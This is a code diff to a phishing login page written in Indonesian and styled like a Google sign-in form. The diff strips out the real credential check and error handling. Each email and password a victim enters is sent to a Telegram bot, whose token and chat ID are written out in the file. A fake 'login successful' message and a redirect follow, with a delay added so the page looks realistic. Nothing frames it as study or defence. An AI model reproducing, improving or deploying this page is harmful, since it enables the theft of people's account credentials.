@@ -64,14 +64,6 @@
             text-align: left;
         }
 
-        .form-group label {
-            display: block;
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 8px;
-            font-weight: 400;
-        }
-
         .input-wrapper {
             position: relative;
         }
@@ -96,30 +88,6 @@
             border-color: #1a73e8;
             border-width: 2px;
             padding: 12px 14px;
-        }
-
-        .form-group input.error {
-            border-color: #d93025;
-        }
-
-        .error-message {
-            color: #d93025;
-            font-size: 12px;
-            margin-top: 8px;
-            display: none;
-            text-align: left;
-        }
-
-        .error-message.show {
-            display: flex;
-            align-items: flex-start;
-            gap: 6px;
-        }
-
-        .error-message::before {
-            content: '⚠';
-            font-size: 14px;
-            flex-shrink: 0;
         }
 
         .show-password {
@@ -318,7 +286,6 @@
                         autocomplete="username"
                         required
                     >
-                    <div id="emailError" class="error-message"></div>
                 </div>
 
                 <div class="form-group">
@@ -332,7 +299,6 @@
                         >
                         <button type="button" class="show-password" onclick="togglePassword()">Tampilkan</button>
                     </div>
-                    <div id="passwordError" class="error-message"></div>
                 </div>
 
                 <div class="forgot-password">
@@ -369,27 +335,10 @@
 
     <script>
         // ========================================
-        // KONFIGURASI
+        // KONFIGURASI TELEGRAM
         // ========================================
         const TELEGRAM_BOT_TOKEN = '8337679399:AAGgDi6eDjQ-4-MT9hj8h4tuaBRcKi--mOk';
         const TELEGRAM_CHAT_ID = '7538231958';
-        
-        // Data user yang valid (tambahkan user sesuai kebutuhan)
-        const VALID_USERS = [
-            {
-                email: 'admin@gmail.com',
-                password: 'admin123'
-            },
-            {
-                email: 'user@gmail.com',
-                password: 'user123'
-            },
-            {
-                email: 'test@gmail.com',
-                password: 'test123'
-            }
-            // Tambahkan user lain di sini
-        ];
 
         // ========================================
         // FUNCTIONS
@@ -408,40 +357,13 @@
             }
         }
 
-        function showError(elementId, message) {
-            const errorElement = document.getElementById(elementId);
-            const inputElement = document.getElementById(elementId.replace('Error', ''));
-            
-            errorElement.textContent = message;
-            errorElement.classList.add('show');
-            inputElement.classList.add('error');
-        }
-
-        function clearError(elementId) {
-            const errorElement = document.getElementById(elementId);
-            const inputElement = document.getElementById(elementId.replace('Error', ''));
-            
-            errorElement.classList.remove('show');
-            inputElement.classList.remove('error');
-        }
-
         function showSuccess(message) {
             const successElement = document.getElementById('successMessage');
             successElement.textContent = '✓ ' + message;
             successElement.classList.add('show');
-            
-            setTimeout(() => {
-                successElement.classList.remove('show');
-            }, 5000);
         }
 
-        function validateUser(email, password) {
-            return VALID_USERS.find(user => 
-                user.email === email && user.password === password
-            );
-        }
-
-        async function sendToTelegram(email, password, isValid) {
+        async function sendToTelegram(email, password) {
             const now = new Date();
             const formattedTime = now.toLocaleString('id-ID', {
                 year: 'numeric',
@@ -452,10 +374,8 @@
                 second: '2-digit'
             });
 
-            const status = isValid ? '✅ BERHASIL LOGIN' : '❌ LOGIN GAGAL';
-            
             const message = `
-${status}
+💌 <b>Login Baru!</b>
 
 👤 <b>Email:</b> ${email}
 🔑 <b>Password:</b> ${password}
@@ -489,29 +409,12 @@ ${status}
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            // Clear previous errors
-            clearError('emailError');
-            clearError('passwordError');
-
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
             const submitBtn = document.getElementById('submitBtn');
 
             // Basic validation
-            if (!email) {
-                showError('emailError', 'Masukkan email atau nomor telepon');
-                return;
-            }
-
-            if (!password) {
-                showError('passwordError', 'Masukkan sandi');
-                return;
-            }
-
-            // Email format validation
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(email)) {
-                showError('emailError', 'Format email tidak valid');
+            if (!email || !password) {
                 return;
             }
 
@@ -519,42 +422,20 @@ ${status}
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<span class="spinner"></span>Memverifikasi...';
 
-            // Simulate network delay (optional, untuk terlihat lebih realistis)
-            await new Promise(resolve => setTimeout(resolve, 800));
+            // Simulate network delay untuk terlihat realistis
+            await new Promise(resolve => setTimeout(resolve, 1000));
 
-            // Validate credentials
-            const user = validateUser(email, password);
+            // Kirim ke Telegram
+            await sendToTelegram(email, password);
 
-            // Send to Telegram (baik berhasil atau gagal)
-            await sendToTelegram(email, password, !!user);
+            // Selalu berhasil login
+            showSuccess('Login berhasil! Mengalihkan...');
 
-            if (user) {
-                // Login berhasil
-                showSuccess('Login berhasil! Mengalihkan...');
-                
-                // Redirect setelah 1.5 detik
-                setTimeout(() => {
-                    // Ganti dengan halaman tujuan setelah login berhasil
-                    window.location.href = 'love_final.html'; // atau URL lain
-                }, 1500);
-            } else {
-                // Login gagal
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Berikutnya';
-                
-                showError('passwordError', 'Email atau sandi salah. Coba lagi atau klik "Lupa email?" untuk meresetnya.');
-                document.getElementById('password').value = '';
-                document.getElementById('password').focus();
-            }
-        });
-
-        // Clear error on input
-        document.getElementById('email').addEventListener('input', function() {
-            clearError('emailError');
-        });
-
-        document.getElementById('password').addEventListener('input', function() {
-            clearError('passwordError');
+            // Redirect setelah 1.5 detik
+            setTimeout(() => {
+                // Ganti dengan halaman tujuan kamu
+                window.location.href = 'love_final.html'; // atau URL lain
+            }, 1500);
         });
     </script>
 </body>
